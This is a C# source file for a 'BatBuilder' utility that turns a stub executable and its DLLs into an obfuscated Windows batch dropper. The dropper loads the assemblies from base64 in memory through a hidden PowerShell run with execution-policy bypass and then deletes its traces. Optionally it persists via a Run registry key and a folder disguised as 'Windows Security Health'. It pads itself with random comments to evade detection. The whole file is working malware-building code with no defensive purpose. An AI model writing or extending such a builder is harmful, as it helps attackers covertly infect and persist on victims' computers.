using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace NRE.Builder.Utilities
{
    /// <summary>
    /// Builds an obfuscated .bat that runs the stub in memory: writes a temp .ps1 only,
    /// PowerShell loads assemblies from base64 and invokes entry point (no exe/dll on disk).
    /// </summary>
    public static class BatBuilder
    {
        private static readonly Random Rng = new Random();
        // Larger chunks = fewer (echo) lines; stay under CMD ~8191 line length
        private const int MaxChunkLen = 8000;

        public static bool BuildBat(string sourceDir, string outputBatPath, bool installStartup = false)
        {
            if (!Directory.Exists(sourceDir))
                return false;

            var allFiles = Directory.GetFiles(sourceDir).ToList();
            var exeFile = allFiles.FirstOrDefault(f => string.Equals(Path.GetFileName(f), "NRE.Stub.exe", StringComparison.OrdinalIgnoreCase));
            if (exeFile == null)
                return false;

            var loadOrder = allFiles
                .OrderBy(f => string.Equals(Path.GetFileName(f), "NRE.Core.dll", StringComparison.OrdinalIgnoreCase) ? 0 : (string.Equals(Path.GetExtension(f), ".dll", StringComparison.OrdinalIgnoreCase) ? 1 : 2))
                .ThenBy(f => Path.GetFileName(f))
                .ToList();

            var scriptLines = new List<string>();
            foreach (var filePath in loadOrder)
            {
                byte[] content = File.ReadAllBytes(filePath);
                string b64 = Convert.ToBase64String(content);
                string varName = Path.GetFileNameWithoutExtension(filePath).Replace(".", "_");
                var chunks = new List<string>();
                for (int i = 0; i < b64.Length; i += MaxChunkLen)
                    chunks.Add(b64.Substring(i, Math.Min(MaxChunkLen, b64.Length - i)));
                for (int i = 0; i < chunks.Count; i++)
                {
                    string line = i == 0 ? "$b64_" + varName + " = \"" + chunks[i] + "\"" : "\"" + chunks[i] + "\"";
                    if (i < chunks.Count - 1) line += " + `";
                    scriptLines.Add(line);
                }
                scriptLines.Add("[void][System.Reflection.Assembly]::Load([Convert]::FromBase64String(($b64_" + varName + " -replace '[\\r\\n]','')))");
            }
            scriptLines.Add("$stub = ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'NRE.Stub' })[0]");
            scriptLines.Add("$stub.EntryPoint.Invoke($null, @(,[string[]]@()))");

            var sb = new StringBuilder();
            string GetVar()
            {
                string v;
                do { v = "x" + Rng.Next(10000, 99999).ToString("X"); } while (v.Contains(" ")); return v;
            }

            sb.AppendLine("@echo off");
            sb.AppendLine("setlocal EnableDelayedExpansion");
            for (int j = 0; j < 2 + Rng.Next(2); j++)
                sb.AppendLine("rem " + RandomStr(20 + Rng.Next(15)));
            string td = GetVar();
            string tdPath = "%temp%\\" + RandomStr(10);
            sb.AppendLine("set \"" + td + "=" + tdPath + "\"");
            sb.AppendLine("if not exist \"!" + td + "!\" mkdir \"!" + td + "!\"");
            string scriptVar = GetVar();
            sb.AppendLine("set \"" + scriptVar + "=!" + td + "!\\r.ps1\"");
            sb.AppendLine("echo Preparing...");
            // Batch 2 lines per write when combined length is under ~8K (CMD limit)
            const int maxCmdLen = 8000;
            for (int i = 0; i < scriptLines.Count; )
            {
                string e1 = EscapeForBatch(scriptLines[i]);
                if (i + 1 >= scriptLines.Count)
                {
                    sb.AppendLine("(echo " + e1 + ")>>\"!" + scriptVar + "!\"");
                    i++;
                }
                else
                {
                    string e2 = EscapeForBatch(scriptLines[i + 1]);
                    string batchCmd = "(echo " + e1 + " & echo " + e2 + ")>>\"!" + scriptVar + "!\"";
                    if (batchCmd.Length <= maxCmdLen)
                    {
                        sb.AppendLine(batchCmd);
                        i += 2;
                    }
                    else
                    {
                        sb.AppendLine("(echo " + e1 + ")>>\"!" + scriptVar + "!\"");
                        i++;
                    }
                }
            }

            sb.AppendLine("set \"ret=0\"");
            sb.AppendLine("for /L %%n in (1,1,3) do if \"!ret!\"==\"0\" ( powershell -NoP -EP Bypass -Window Hidden -File \"!" + scriptVar + "!\" 2>nul && set \"ret=1\" )");
            sb.AppendLine("del \"!" + scriptVar + "!\" 2>nul");
            sb.AppendLine("rd /s /q \"!" + td + "!\" 2>nul");

            if (installStartup)
            {
                string id = GetVar();
                string dest = GetVar();
                string idPath = "%appdata%\\Microsoft\\Windows Security Health";
                string batName = RandomStr(8);
                sb.AppendLine("set \"" + id + "=" + idPath + "\"");
                sb.AppendLine("if not exist \"!" + id + "!\" mkdir \"!" + id + "!\"");
                sb.AppendLine("set \"" + dest + "=!" + id + "!\\" + batName + ".bat\"");
                sb.AppendLine("copy /y \"%~f0\" \"!" + dest + "!\" >nul 2>&1");
                sb.AppendLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SecurityHealth /t REG_SZ /d \"\\\"!" + dest + "!\\\"\" /f >nul 2>&1");
            }

            sb.AppendLine("endlocal");
            sb.AppendLine("exit /b 0");

            string bat = sb.ToString();
            sb.Clear();
            foreach (var line in bat.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
            {
                if (line.StartsWith("powershell", StringComparison.OrdinalIgnoreCase))
                {
                    sb.AppendLine(ObfuscatePowershellLine(line));
                    continue;
                }
                string obf = ObfuscateBatchLine(line);
                sb.AppendLine(obf);
            }

            File.WriteAllText(outputBatPath, sb.ToString(), new UTF8Encoding(false));
            return true;
        }

        private static string EscapeForBatch(string s)
        {
            return s.Replace("^", "^^").Replace(")", "^)").Replace("&", "^&").Replace("|", "^|").Replace("%", "%%").Replace("<", "^<").Replace(">", "^>");
        }

        private static string RandomStr(int len)
        {
            const string c = "abcdefghijklmnopqrstuvwxyz0123456789";
            var b = new char[len];
            for (int i = 0; i < len; i++) b[i] = c[Rng.Next(c.Length)];
            return new string(b);
        }

        private static string ObfuscateBatchLine(string line)
        {
            if (string.IsNullOrWhiteSpace(line)) return line;
            if (line.TrimStart().StartsWith("rem ", StringComparison.OrdinalIgnoreCase))
                return "rem " + RandomStr(Rng.Next(12, 35));
            if (Rng.Next(4) == 0 && (line.TrimStart().StartsWith("set ", StringComparison.OrdinalIgnoreCase) || line.TrimStart().StartsWith("if ", StringComparison.OrdinalIgnoreCase) || line.TrimStart().StartsWith("for ", StringComparison.OrdinalIgnoreCase)))
                return "rem " + RandomStr(20) + "\r\n" + line;
            if (Rng.Next(6) == 0 && line.TrimStart().StartsWith("(echo ", StringComparison.OrdinalIgnoreCase))
                return "rem " + RandomStr(18) + "\r\n" + line;
            return line;
        }

        private static string ObfuscatePowershellLine(string line)
        {
            return line;
        }
    }
}
